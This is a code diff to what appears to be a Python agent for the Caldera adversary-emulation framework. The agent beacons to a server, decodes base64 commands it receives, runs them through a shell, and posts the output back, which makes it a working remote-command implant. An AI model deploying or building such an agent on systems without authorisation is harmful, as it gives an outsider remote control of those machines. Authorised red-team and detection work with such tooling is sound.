@@ -6,6 +6,7 @@ import socket
 import os
 import platform
 import time
+import requests
 
 
 class OperationLoop:
@@ -14,6 +15,8 @@ class OperationLoop:
         self.profile = profile
         self.file_download_endpoint = "/file/download"
         self.file_download_url = self.profile['server'].split('/weather')[0] + self.file_download_endpoint
+        #Caldera server gives instructions through an ID and a command encoded base64 (also other parameters). 
+        #This instruction_id is like a primary key so that Caldera knows to which instruction corresponds the output given by the agent.
         self.instruction_id = ''
 
     def start(self):
@@ -32,15 +35,10 @@ class OperationLoop:
                 time.sleep(30)
 
     def _send_beacon(self):
-        profilejson = json.dumps(self.profile).encode('utf-8')
-        profileb64 = base64.b64encode(profilejson).decode('utf-8')
-        curl_cmd = f"curl -s -X POST -d {profileb64} localhost:8888/beacon"
-        raw_result = subprocess.run(curl_cmd, shell=True,
-                                    capture_output=True)  # shell=True may be a security concern. Watch out!
-
-        result_dict = self.decodeshell_to_json(
-            raw_result)  # from here we can retrieve all parameters given by caldera server
-
+       
+        raw_result = requests.post(self.profile['server'], data=self.encode_to_b64(self.profile)).content.decode('utf-8')
+        print("risultatooo" + raw_result)
+        result_dict = self.decode_to_json(raw_result)  # from here we can retrieve all parameters given by caldera server
         # Retrieve all needeed parameters
         self.profile['paw'] = result_dict['paw']
         return result_dict
@@ -59,17 +57,11 @@ class OperationLoop:
         else:
             command = ''
         decoded_command = base64.b64decode(command)
-        print(decoded_command)
         output = subprocess.run(decoded_command, shell=True, capture_output=True)
-        print("Risultato shell:", output)
         response = self.build_response(output)
         # Send back the beacon response to Caldera server
-        responsejson = json.dumps(response).encode('utf-8')
-        beaconb64 = base64.b64encode(responsejson).decode('utf-8')
-        print("VEDI QUA" + beaconb64)
-        curl_cmd = f"curl -s -X POST -d {beaconb64} localhost:8888/beacon"
-        beaconanswer = subprocess.run(curl_cmd, shell=True, capture_output=True)
-        beaconanswer = self.decodeshell_to_json(beaconanswer)
+        responseb64 = requests.post(self.profile['server'], data=self.encode_to_b64(response)).content.decode('utf-8')
+        beaconanswer = self.decode_to_json(responseb64)
         return beaconanswer['sleep']
 
     def build_response(self, output):
@@ -86,13 +78,16 @@ class OperationLoop:
         )
 
     @staticmethod
-    def decodeshell_to_json(s):
-        b64result = s.stdout.decode('utf-8')
-
-        result = base64.b64decode(b64result)
-
+    def decode_to_json(s):
+        result = base64.b64decode(s)
         result_dict = json.loads(result)
         return result_dict
+
+    @staticmethod
+    def encode_to_b64(s):
+        responsejson = json.dumps(s).encode('utf-8')
+        stringb64 = base64.b64encode(responsejson).decode('utf-8')
+        return stringb64
 
 
 def build_profile(server_addr):
